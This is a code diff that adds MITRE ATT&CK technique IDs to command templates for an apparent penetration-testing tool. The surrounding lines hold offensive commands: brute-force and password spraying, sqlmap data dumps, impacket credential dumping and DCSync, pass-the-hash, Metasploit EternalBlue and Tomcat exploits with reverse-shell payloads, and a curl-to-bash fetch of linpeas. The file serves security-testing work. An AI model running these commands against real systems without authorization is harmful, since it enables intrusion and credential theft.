@@ -23,6 +23,7 @@ export interface CommandTemplate {
   command: string
   vars: string[]        // variable names that appear in the command
   tags?: string[]
+  mitre_techniques?: string[]   // ATT&CK T-IDs (e.g. "T1046", "T1595.003")
 }
 
 export const TEMPLATES: CommandTemplate[] = [
@@ -40,6 +41,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'sudo nmap -sS -sV -sC -O -p- --open -T4 -v {{ target }}',
     vars: ['target'],
     tags: ['nmap', 'tcp', 'recon', 'scanning'],
+    mitre_techniques: ['T1046'],
   },
   {
     id: 'nmap-quick',
@@ -52,6 +54,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nmap -sV --top-ports 1000 -T4 {{ target }}',
     vars: ['target'],
     tags: ['nmap', 'quick', 'recon'],
+    mitre_techniques: ['T1046'],
   },
   {
     id: 'nmap-udp',
@@ -64,6 +67,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'sudo nmap -sU --top-ports 200 -T4 {{ target }}',
     vars: ['target'],
     tags: ['nmap', 'udp', 'snmp'],
+    mitre_techniques: ['T1046'],
   },
   {
     id: 'nmap-vuln',
@@ -76,6 +80,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nmap --script vuln -p {{ ports }} {{ target }}',
     vars: ['ports', 'target'],
     tags: ['nmap', 'vuln', 'cve'],
+    mitre_techniques: ['T1046', 'T1595.002'],
   },
   {
     id: 'nmap-web',
@@ -88,6 +93,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nmap -sV -p 80,443,8080,8443,8000,8888 --script http-enum,http-methods,http-headers {{ target }}',
     vars: ['target'],
     tags: ['nmap', 'web', 'http'],
+    mitre_techniques: ['T1046', 'T1595.002'],
   },
   {
     id: 'nmap-ad-ports',
@@ -100,6 +106,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nmap -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 {{ target }}',
     vars: ['target'],
     tags: ['nmap', 'active-directory', 'kerberos', 'ldap'],
+    mitre_techniques: ['T1046', 'T1018'],
   },
 
   // ── MASSCAN ─────────────────────────────────────────────────────────────────
@@ -115,6 +122,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'sudo masscan {{ target }} -p1-65535 --rate=1000 -oL masscan_results.txt',
     vars: ['target'],
     tags: ['masscan', 'port-discovery', 'fast'],
+    mitre_techniques: ['T1046'],
   },
   {
     id: 'masscan-subnet',
@@ -127,6 +135,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'sudo masscan {{ target }}/24 -p21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443 --rate=500',
     vars: ['target'],
     tags: ['masscan', 'subnet', 'internal'],
+    mitre_techniques: ['T1046', 'T1018'],
   },
 
   // ── RUSTSCAN ────────────────────────────────────────────────────────────────
@@ -142,6 +151,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'rustscan -a {{ target }} --ulimit 5000 -- -sV -sC',
     vars: ['target'],
     tags: ['rustscan', 'nmap', 'fast', 'port-discovery'],
+    mitre_techniques: ['T1046'],
   },
 
   // ── GOBUSTER ─────────────────────────────────────────────────────────────────
@@ -157,6 +167,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'gobuster dir -u http://{{ target }} -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt,bak,old',
     vars: ['target'],
     tags: ['gobuster', 'web', 'directory', 'enumeration'],
+    mitre_techniques: ['T1595.003'],
   },
   {
     id: 'gobuster-dir-large',
@@ -169,6 +180,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'gobuster dir -u http://{{ target }} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x php,html,js,json,txt',
     vars: ['target'],
     tags: ['gobuster', 'web', 'seclists'],
+    mitre_techniques: ['T1595.003'],
   },
   {
     id: 'gobuster-dns',
@@ -181,6 +193,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'gobuster dns -d {{ target }} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 30',
     vars: ['target'],
     tags: ['gobuster', 'dns', 'subdomains'],
+    mitre_techniques: ['T1595.003', 'T1590.001'],
   },
   {
     id: 'gobuster-vhost',
@@ -193,6 +206,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'gobuster vhost -u http://{{ target }} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain',
     vars: ['target'],
     tags: ['gobuster', 'vhost', 'web'],
+    mitre_techniques: ['T1595.003'],
   },
 
   // ── FFUF ─────────────────────────────────────────────────────────────────────
@@ -208,6 +222,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'ffuf -u http://{{ target }}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 40',
     vars: ['target'],
     tags: ['ffuf', 'web', 'directory'],
+    mitre_techniques: ['T1595.003'],
   },
   {
     id: 'ffuf-params',
@@ -220,6 +235,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'ffuf -u "http://{{ target }}/{{ path }}?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs {{ filter_size }}',
     vars: ['target', 'path', 'filter_size'],
     tags: ['ffuf', 'parameters', 'web'],
+    mitre_techniques: ['T1595.003'],
   },
   {
     id: 'ffuf-vhost',
@@ -232,6 +248,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'ffuf -u http://{{ target }} -H "Host: FUZZ.{{ domain }}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -fs {{ filter_size }}',
     vars: ['target', 'domain', 'filter_size'],
     tags: ['ffuf', 'vhost', 'web'],
+    mitre_techniques: ['T1595.003'],
   },
   {
     id: 'ffuf-post-fuzz',
@@ -244,6 +261,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'ffuf -u "http://{{ target }}/{{ path }}" -X POST -d "username=admin&FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200',
     vars: ['target', 'path'],
     tags: ['ffuf', 'post', 'injection'],
+    mitre_techniques: ['T1190'],
   },
 
   // ── NIKTO ────────────────────────────────────────────────────────────────────
@@ -259,6 +277,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nikto -h {{ target }} -maxtime 300',
     vars: ['target'],
     tags: ['nikto', 'web', 'scanning'],
+    mitre_techniques: ['T1595', 'T1190'],
   },
   {
     id: 'nikto-https',
@@ -271,6 +290,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nikto -h {{ target }} -ssl -port 443 -maxtime 300',
     vars: ['target'],
     tags: ['nikto', 'https', 'ssl'],
+    mitre_techniques: ['T1595', 'T1190'],
   },
 
   // ── NUCLEI ───────────────────────────────────────────────────────────────────
@@ -286,6 +306,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nuclei -u http://{{ target }} -severity medium,high,critical -o nuclei_results.txt',
     vars: ['target'],
     tags: ['nuclei', 'web', 'cve', 'scanning'],
+    mitre_techniques: ['T1595.002', 'T1190'],
   },
   {
     id: 'nuclei-tech',
@@ -298,6 +319,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nuclei -u http://{{ target }} -tags tech -silent',
     vars: ['target'],
     tags: ['nuclei', 'fingerprint', 'technology'],
+    mitre_techniques: ['T1592.002'],
   },
 
   // ── FEROXBUSTER ──────────────────────────────────────────────────────────────
@@ -313,6 +335,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'feroxbuster -u http://{{ target }} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 --depth 3',
     vars: ['target'],
     tags: ['feroxbuster', 'recursive', 'web'],
+    mitre_techniques: ['T1595.003'],
   },
 
   // ── TESTSSL ──────────────────────────────────────────────────────────────────
@@ -328,6 +351,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'testssl.sh --severity MEDIUM {{ target }}:443',
     vars: ['target'],
     tags: ['testssl', 'tls', 'ssl', 'https'],
+    mitre_techniques: ['T1595.002'],
   },
 
   // ── SQLMAP ───────────────────────────────────────────────────────────────────
@@ -343,6 +367,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'sqlmap -u "http://{{ target }}" --batch --crawl=3 --level=3 --risk=2',
     vars: ['target'],
     tags: ['sqlmap', 'sqli', 'web'],
+    mitre_techniques: ['T1190'],
   },
   {
     id: 'sqlmap-param',
@@ -355,6 +380,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'sqlmap -u "http://{{ target }}/{{ path }}?{{ param }}=1" -p {{ param }} --batch --dbs',
     vars: ['target', 'path', 'param'],
     tags: ['sqlmap', 'sqli', 'targeted'],
+    mitre_techniques: ['T1190'],
   },
   {
     id: 'sqlmap-dump',
@@ -367,6 +393,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'sqlmap -u "http://{{ target }}/{{ path }}?{{ param }}=1" -D {{ database }} -T {{ table }} --dump --batch',
     vars: ['target', 'path', 'param', 'database', 'table'],
     tags: ['sqlmap', 'dump', 'data-extraction'],
+    mitre_techniques: ['T1190', 'T1005'],
   },
   {
     id: 'sqlmap-request',
@@ -379,6 +406,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'sqlmap -r {{ request_file }} --batch --level=3 --risk=2 --dbs',
     vars: ['request_file'],
     tags: ['sqlmap', 'burp', 'post', 'authenticated'],
+    mitre_techniques: ['T1190'],
   },
 
   // ── HYDRA ────────────────────────────────────────────────────────────────────
@@ -394,6 +422,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'hydra -L {{ users_file }} -P {{ passwords_file }} {{ target }} ssh -t 4 -V',
     vars: ['users_file', 'passwords_file', 'target'],
     tags: ['hydra', 'ssh', 'brute-force'],
+    mitre_techniques: ['T1110.001'],
   },
   {
     id: 'hydra-http-form',
@@ -406,6 +435,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'hydra -L {{ users_file }} -P {{ passwords_file }} {{ target }} http-post-form "/{{ login_path }}:{{ post_params }}:F={{ fail_string }}"',
     vars: ['users_file', 'passwords_file', 'target', 'login_path', 'post_params', 'fail_string'],
     tags: ['hydra', 'http', 'form', 'web'],
+    mitre_techniques: ['T1110.001'],
   },
   {
     id: 'hydra-smb',
@@ -418,6 +448,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'hydra -L {{ users_file }} -P {{ passwords_file }} {{ target }} smb -V',
     vars: ['users_file', 'passwords_file', 'target'],
     tags: ['hydra', 'smb', 'brute-force'],
+    mitre_techniques: ['T1110.001'],
   },
 
   // ── SEARCHSPLOIT ─────────────────────────────────────────────────────────────
@@ -434,6 +465,7 @@ export const TEMPLATES: CommandTemplate[] = [
     vars: ['service_name', 'service_version'],
     details: 'Valid flags: -t (title-only search), -w (show web links), --id (show EDB-ID), -m <EDB-ID> (copy exploit). There is NO --exploit flag — do not invent flags.',
     tags: ['searchsploit', 'exploitdb', 'cve'],
+    mitre_techniques: ['T1588.005'],
   },
   {
     id: 'searchsploit-copy',
@@ -446,6 +478,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'searchsploit -m {{ edb_id }}',
     vars: ['edb_id'],
     tags: ['searchsploit', 'copy', 'exploit'],
+    mitre_techniques: ['T1588.005'],
   },
 
   // ── WHOIS / DIG ──────────────────────────────────────────────────────────────
@@ -461,6 +494,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'whois {{ target }}',
     vars: ['target'],
     tags: ['whois', 'osint', 'recon'],
+    mitre_techniques: ['T1590.001'],
   },
   {
     id: 'dig-all',
@@ -473,6 +507,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'dig {{ target }} ANY +noall +answer',
     vars: ['target'],
     tags: ['dig', 'dns', 'osint'],
+    mitre_techniques: ['T1590.002'],
   },
   {
     id: 'dig-zone-transfer',
@@ -485,6 +520,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'dig @{{ nameserver }} {{ target }} AXFR',
     vars: ['nameserver', 'target'],
     tags: ['dig', 'zone-transfer', 'dns'],
+    mitre_techniques: ['T1590.002'],
   },
 
   // ── THEHARVESTER / SUBFINDER ──────────────────────────────────────────────────
@@ -500,6 +536,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'theHarvester -d {{ target }} -b all -l 200',
     vars: ['target'],
     tags: ['theharvester', 'osint', 'emails', 'subdomains'],
+    mitre_techniques: ['T1593', 'T1596'],
   },
   {
     id: 'subfinder-passive',
@@ -512,6 +549,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'subfinder -d {{ target }} -silent -o subfinder_results.txt',
     vars: ['target'],
     tags: ['subfinder', 'subdomains', 'passive', 'osint'],
+    mitre_techniques: ['T1590.001'],
   },
 
   // ── ENUM4LINUX / SMB ─────────────────────────────────────────────────────────
@@ -527,6 +565,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'enum4linux -a {{ target }}',
     vars: ['target'],
     tags: ['enum4linux', 'smb', 'active-directory', 'enumeration'],
+    mitre_techniques: ['T1018', 'T1069.002', 'T1087.002', 'T1135'],
   },
   {
     id: 'smbclient-list',
@@ -539,6 +578,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'smbclient -L //{{ target }} -N',
     vars: ['target'],
     tags: ['smbclient', 'smb', 'shares'],
+    mitre_techniques: ['T1135'],
   },
 
   // ── NXC / NETEXEC ────────────────────────────────────────────────────────────
@@ -554,6 +594,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nxc smb {{ target }} -u \'\' -p \'\' --shares',
     vars: ['target'],
     tags: ['nxc', 'smb', 'null-session'],
+    mitre_techniques: ['T1135', 'T1087'],
   },
   {
     id: 'nxc-password-policy',
@@ -566,6 +607,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nxc smb {{ target }} -u \'\' -p \'\' --pass-pol',
     vars: ['target'],
     tags: ['nxc', 'password-policy', 'active-directory'],
+    mitre_techniques: ['T1201'],
   },
   {
     id: 'nxc-user-enum',
@@ -578,6 +620,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nxc ldap {{ target }} -u {{ username }} -p {{ password }} --users',
     vars: ['target', 'username', 'password'],
     tags: ['nxc', 'ldap', 'users'],
+    mitre_techniques: ['T1087.002'],
   },
   {
     id: 'nxc-spray',
@@ -590,6 +633,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nxc smb {{ target }}/24 -u {{ username }} -p {{ password }} --continue-on-success',
     vars: ['target', 'username', 'password'],
     tags: ['nxc', 'spray', 'lateral-movement'],
+    mitre_techniques: ['T1110.003'],
   },
   {
     id: 'nxc-pth',
@@ -602,6 +646,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nxc smb {{ target }} -u {{ username }} -H {{ ntlm_hash }} --local-auth',
     vars: ['target', 'username', 'ntlm_hash'],
     tags: ['nxc', 'pass-the-hash', 'ntlm'],
+    mitre_techniques: ['T1550.002'],
   },
   {
     id: 'nxc-exec',
@@ -614,6 +659,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'nxc smb {{ target }} -u {{ username }} -p {{ password }} -x "{{ command }}"',
     vars: ['target', 'username', 'password', 'command'],
     tags: ['nxc', 'execution', 'smb'],
+    mitre_techniques: ['T1021.002'],
   },
 
   // ── KERBRUTE ─────────────────────────────────────────────────────────────────
@@ -629,6 +675,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'kerbrute userenum --dc {{ target }} -d {{ domain }} /usr/share/seclists/Usernames/Names/names.txt',
     vars: ['target', 'domain'],
     tags: ['kerbrute', 'kerberos', 'user-enumeration', 'quiet'],
+    mitre_techniques: ['T1087.002'],
   },
   {
     id: 'kerbrute-spray',
@@ -641,6 +688,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'kerbrute passwordspray --dc {{ target }} -d {{ domain }} users.txt {{ password }}',
     vars: ['target', 'domain', 'password'],
     tags: ['kerbrute', 'spray', 'kerberos'],
+    mitre_techniques: ['T1110.003'],
   },
 
   // ── IMPACKET ─────────────────────────────────────────────────────────────────
@@ -656,6 +704,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: "impacket-GetUserSPNs '{{ domain }}/{{ username }}:{{ password }}' -dc-ip {{ target }} -request -outputfile kerberoast_hashes.txt",
     vars: ['domain', 'username', 'password', 'target'],
     tags: ['impacket', 'kerberoast', 'active-directory'],
+    mitre_techniques: ['T1558.003'],
   },
   {
     id: 'impacket-asrep',
@@ -668,6 +717,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: "impacket-GetNPUsers '{{ domain }}/' -dc-ip {{ target }} -usersfile users.txt -no-pass -format hashcat -outputfile asrep_hashes.txt",
     vars: ['domain', 'target'],
     tags: ['impacket', 'as-rep', 'kerberos'],
+    mitre_techniques: ['T1558.004'],
   },
   {
     id: 'impacket-secretsdump',
@@ -680,6 +730,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: "impacket-secretsdump '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'",
     vars: ['domain', 'username', 'password', 'target'],
     tags: ['impacket', 'secretsdump', 'credentials', 'post-exploitation'],
+    mitre_techniques: ['T1003.002'],
   },
   {
     id: 'impacket-dcsync',
@@ -692,6 +743,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: "impacket-secretsdump -just-dc-ntlm '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'",
     vars: ['domain', 'username', 'password', 'target'],
     tags: ['impacket', 'dcsync', 'golden-ticket', 'domain-admin'],
+    mitre_techniques: ['T1003.006'],
   },
   {
     id: 'impacket-psexec',
@@ -704,6 +756,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: "impacket-psexec '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'",
     vars: ['domain', 'username', 'password', 'target'],
     tags: ['impacket', 'psexec', 'shell', 'windows'],
+    mitre_techniques: ['T1021.002'],
   },
   {
     id: 'impacket-wmiexec',
@@ -716,6 +769,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: "impacket-wmiexec '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'",
     vars: ['domain', 'username', 'password', 'target'],
     tags: ['impacket', 'wmiexec', 'wmi', 'stealth'],
+    mitre_techniques: ['T1047'],
   },
 
   // ── RESPONDER ─────────────────────────────────────────────────────────────────
@@ -731,6 +785,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'sudo responder -I {{ interface }} -rdwv',
     vars: ['interface'],
     tags: ['responder', 'llmnr', 'ntlmv2', 'hashes', 'internal'],
+    mitre_techniques: ['T1557.001'],
   },
 
   // ── POST-EXPLOITATION ─────────────────────────────────────────────────────────
@@ -746,6 +801,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | tee linpeas_output.txt',
     vars: [],
     tags: ['linpeas', 'privesc', 'linux', 'post-exploitation'],
+    mitre_techniques: ['T1083', 'T1057', 'T1068'],
   },
   {
     id: 'pspy',
@@ -758,6 +814,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: './pspy64 -i 1000',
     vars: [],
     tags: ['pspy', 'cron', 'processes', 'linux'],
+    mitre_techniques: ['T1057', 'T1053.003'],
   },
 
   // ── METASPLOIT ────────────────────────────────────────────────────────────────
@@ -773,6 +830,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS {{ target }}; run; exit -y"',
     vars: ['target'],
     tags: ['msf', 'eternalblue', 'ms17-010', 'smb'],
+    mitre_techniques: ['T1595.002'],
   },
   {
     id: 'msf-eternalblue-exploit',
@@ -785,6 +843,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {{ target }}; set LHOST {{ lhost }}; set LPORT {{ lport }}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit; sleep 10; exit -y"',
     vars: ['target', 'lhost', 'lport'],
     tags: ['msf', 'eternalblue', 'rce', 'system'],
+    mitre_techniques: ['T1190', 'T1068'],
   },
   {
     id: 'msf-tomcat',
@@ -797,6 +856,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {{ target }}; set RPORT {{ port }}; set HttpUsername {{ username }}; set HttpPassword {{ password }}; set LHOST {{ lhost }}; set PAYLOAD java/meterpreter/reverse_tcp; exploit; sleep 10; exit -y"',
     vars: ['target', 'port', 'username', 'password', 'lhost'],
     tags: ['msf', 'tomcat', 'war', 'rce'],
+    mitre_techniques: ['T1190'],
   },
   {
     id: 'msf-vsftpd',
@@ -809,6 +869,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {{ target }}; exploit; sleep 5; exit -y"',
     vars: ['target'],
     tags: ['msf', 'vsftpd', 'backdoor', 'ftp'],
+    mitre_techniques: ['T1190'],
   },
   {
     id: 'msf-exploit-suggester',
@@ -821,6 +882,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'msfconsole -q -x "use post/multi/recon/local_exploit_suggester; set SESSION {{ session_id }}; run; exit -y"',
     vars: ['session_id'],
     tags: ['msf', 'privesc', 'post-exploitation'],
+    mitre_techniques: ['T1068'],
   },
   {
     id: 'msf-hashdump-linux',
@@ -833,6 +895,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'msfconsole -q -x "use post/linux/gather/hashdump; set SESSION {{ session_id }}; run; exit -y"',
     vars: ['session_id'],
     tags: ['msf', 'hashdump', 'linux', 'post-exploitation'],
+    mitre_techniques: ['T1003.008'],
   },
   {
     id: 'msf-hashdump-windows',
@@ -845,6 +908,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'msfconsole -q -x "use post/windows/gather/hashdump; set SESSION {{ session_id }}; run; exit -y"',
     vars: ['session_id'],
     tags: ['msf', 'hashdump', 'windows', 'ntlm'],
+    mitre_techniques: ['T1003.002'],
   },
 
   // ── AWS ───────────────────────────────────────────────────────────────────────
@@ -860,6 +924,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'aws sts get-caller-identity --profile {{ aws_profile }}',
     vars: ['aws_profile'],
     tags: ['aws', 'iam', 'cloud', 'recon'],
+    mitre_techniques: ['T1078.004', 'T1526'],
   },
   {
     id: 'aws-iam-privesc-check',
@@ -872,6 +937,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'aws iam list-attached-user-policies --user-name {{ username }} --profile {{ aws_profile }} && aws iam list-user-policies --user-name {{ username }} --profile {{ aws_profile }}',
     vars: ['username', 'aws_profile'],
     tags: ['aws', 'iam', 'permissions', 'cloud'],
+    mitre_techniques: ['T1078.004', 'T1069.003'],
   },
   {
     id: 'aws-s3-list',
@@ -884,6 +950,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'aws s3api list-buckets --profile {{ aws_profile }} && aws s3 ls s3://{{ bucket_name }} --profile {{ aws_profile }}',
     vars: ['aws_profile', 'bucket_name'],
     tags: ['aws', 's3', 'data-exposure', 'cloud'],
+    mitre_techniques: ['T1530'],
   },
   {
     id: 'aws-ec2-instances',
@@ -896,6 +963,7 @@ export const TEMPLATES: CommandTemplate[] = [
     command: 'aws ec2 describe-instances --profile {{ aws_profile }} --region {{ aws_region }} --query "Reservations[].Instances[].{ID:InstanceId,IP:PublicIpAddress,State:State.Name,SG:SecurityGroups[].GroupName}" --output table',
     vars: ['aws_profile', 'aws_region'],
     tags: ['aws', 'ec2', 'cloud', 'enumeration'],
+    mitre_techniques: ['T1526'],
   },
 ]
 
